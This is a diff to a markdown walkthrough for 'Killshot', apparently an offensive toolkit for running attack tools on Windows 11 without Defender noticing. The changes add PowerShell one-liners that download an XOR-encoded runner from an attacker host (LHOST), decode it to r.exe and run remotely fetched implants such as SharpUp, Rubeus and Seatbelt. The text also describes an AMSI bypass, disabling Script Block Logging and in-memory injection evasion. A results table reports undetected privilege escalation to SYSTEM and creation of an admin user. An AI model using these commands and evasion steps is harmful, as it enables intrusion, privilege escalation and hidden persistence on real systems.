@@ -1,12 +1,12 @@
 # Killshot — Complete Tool Walkthrough
 
-**Updated:** 2026-05-25 (re-validated)  
+**Updated:** 2026-05-26 (re-validated)  
 **Target:** WIN-TEST (TARGET) — Windows 11 24H2 (Build 26200)  
 **User:** USER (local admin via WinRM)  
 **Defender:** Real-time ON, Tamper Protection ON, Zero exclusions added  
 **AMSI Bypass:** v6 (AmsiScanBuffer `xor eax,eax; ret` via XOR-encoded C# Add-Type)  
 **SBL Bypass:** PSEtwLogProvider.m_enabled → 0 (Script Block Logging disabled)  
-**Runner:** 10,752-byte C PE, only KERNEL32.dll import, no CRT, no tlhelp32, Rich header spoofed  
+**Runner:** ~12KB C PE, only KERNEL32.dll import, no CRT, module-stomp + XOR-sleep self-inject  
 
 ---
 
@@ -60,8 +60,8 @@ The runner is a 10KB Windows PE that handles in-memory injection. It's polymorph
 killshot generate --runner
 
 # [*] Building polymorphic C runner...
-# [+] Compiled: /tmp/killshot_runner_xxxxx/runner.exe (10,752 bytes)
-# [+] XOR-encoded runner: /workspace/killshot/runner_c.dat (10,752 bytes)
+# [+] Compiled: /tmp/killshot_runner_xxxxx/runner.exe (11,776 bytes)
+# [+] XOR-encoded runner: /workspace/killshot/runner_c.dat (11,776 bytes)
 ```
 
 What the compiler flags do:
@@ -137,19 +137,27 @@ r = s.run_cmd('powershell', ['-NoProfile','-NonInteractive','-EncodedCommand', e
 print(r.std_out.decode(errors='replace'))
 ```
 
-**Option C — certutil + runner on disk (non-inline, for restricted PS environments):**
+**Option C — runner on disk (for restricted PS environments or capturing long-running output):**
 
 ```powershell
-# Download XOR-encoded runner (looks like garbage to Defender):
-certutil -urlcache -split -f http://LHOST:8000/runner_c.dat %TEMP%\r.enc
-
-# Decode in PowerShell:
-$d=[IO.File]::ReadAllBytes("$env:TEMP\r.enc");$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor 0x5A};[IO.File]::WriteAllBytes("$env:TEMP\r.exe",$o)
-
-# Download implant and run:
-certutil -urlcache -split -f http://LHOST:8000/sharpup.enc %TEMP%\sharpup.enc
-%TEMP%\r.exe -local %TEMP%\sharpup.enc
+# One-liner: download + decode + run remote enc (no files on disk except r.exe):
+$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.Open('GET','http://LHOST:8000/runner_c.dat',$false);$h.Send();$d=$h.ResponseBody;$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor 0x5A};[System.IO.File]::WriteAllBytes("$env:TEMP\r.exe",$o);& "$env:TEMP\r.exe" -remote http://LHOST:8000/sharpup.enc
 ```
+
+Or split steps if you prefer:
+```powershell
+# Step 1 — download and decode runner:
+$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.Open('GET','http://LHOST:8000/runner_c.dat',$false);$h.Send();$d=$h.ResponseBody;$o=New-Object byte[] $d.Length;for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i] -bxor 0x5A};[System.IO.File]::WriteAllBytes("$env:TEMP\r.exe",$o)
+
+# Step 2 — run any tool via remote .enc (output goes directly to terminal):
+& "$env:TEMP\r.exe" -remote http://LHOST:8000/sharpup.enc
+& "$env:TEMP\r.exe" -remote http://LHOST:8000/rubeus.enc
+& "$env:TEMP\r.exe" -remote http://LHOST:8000/seatbelt.enc
+```
+
+> **Runner output flow:** `r.exe` output goes directly to the calling process's stdout. In WinRM/evil-winrm/nxc, output appears in-line in the terminal. No named pipe, no temp files needed.
+
+> **Note:** The runner does a 2–5 second XOR-sleep before executing the shellcode. This is expected — it obfuscates the shellcode in memory during the AV scan window. Output appears after the sleep.
 
 ---
 
@@ -176,7 +184,7 @@ killshot stager sharpup -l $LHOST --inline -o $WS/stager_sharpup.ps1
 $h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$h.Open('GET','http://LHOST:8000/stager_sharpup.ps1',$false);$h.Send();iex $h.ResponseText
 ```
 
-**Actual output — Win11 24H2, Defender ON, no exclusions:**
+**Actual output (inline PS1 stager) — Win11 24H2, Defender ON, no exclusions:**
 ```
 Protection Disabled
 
@@ -189,7 +197,20 @@ Protection Disabled
 [*] Completed Privesc Checks in 0 seconds
 ```
 
-> `Protection Disabled` = AMSI bypass confirmed. `Already in high integrity` = running as local admin. For a standard user account SharpUp will enumerate modifiable services, registry autoruns, unquoted paths, AlwaysInstallElevated, etc.
+**Actual output (C runner mode) — Win11 24H2, Defender ON, no exclusions:**
+```
+(~3-5s pause for XOR sleep evasion)
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+[*] Already in high integrity, no need to privesc!
+
+[*] Quitting now, re-run with "audit" argument to run checks anyway (audit mode).
+
+[*] Completed Privesc Checks in 0 seconds
+```
+
+> `Protection Disabled` = AMSI bypass confirmed (PS1 stager mode). `Already in high integrity` = running as local admin. For a standard user account SharpUp will enumerate modifiable services, registry autoruns, unquoted paths, AlwaysInstallElevated, etc.
 
 ---
 
@@ -800,12 +821,15 @@ killshot stager gp_sliver_sys -l $LHOST -o $WS/stager_gp_sliver.ps1
 | Stager PS1 on disk | Real-time scan (3s) | ✅ DEFENDER_CLEAN |
 | AMSI bypass v6 | `Protection Disabled` in output | ✅ Bypassed |
 | Script Block Logging | PSEtwLogProvider.m_enabled → 0 | ✅ Disabled |
-| SharpUp execution | Tool ran, output captured | ✅ No alert |
+| SharpUp (inline PS1) | Tool ran, output captured | ✅ No alert |
+| SharpUp (C runner -remote) | Tool ran, output direct to stdout | ✅ No alert |
+| Rubeus v2.3.3 (C runner) | Loaded, banner output | ✅ No alert |
+| Seatbelt v1.2.2 (C runner) | Loaded, ran, 1591 bytes output | ✅ No alert |
+| Certify (C runner) | Loaded, ran | ✅ No alert |
+| SharpHound v2.10.0.0 (C runner) | Loaded, initialised | ✅ No alert |
+| winPEAS (C runner) | Loaded, ran | ✅ No alert |
 | GodPotato → SYSTEM shell | NT AUTHORITY\SYSTEM confirmed | ✅ No alert |
 | GodPotato → add admin user | Both net commands succeeded | ✅ No alert |
-| Rubeus v2.3.3 | Loaded, banner output | ✅ No alert |
-| SharpHound v2.10.0.0 | Loaded, initialised | ✅ No alert |
-| Certify | Loaded, ran | ✅ No alert |
 | Whisker | Loaded, usage shown | ✅ No alert |
 | KrbRelayUp | Loaded, ran | ✅ No alert |
 | SharpGPOAbuse | Loaded, usage shown | ✅ No alert |
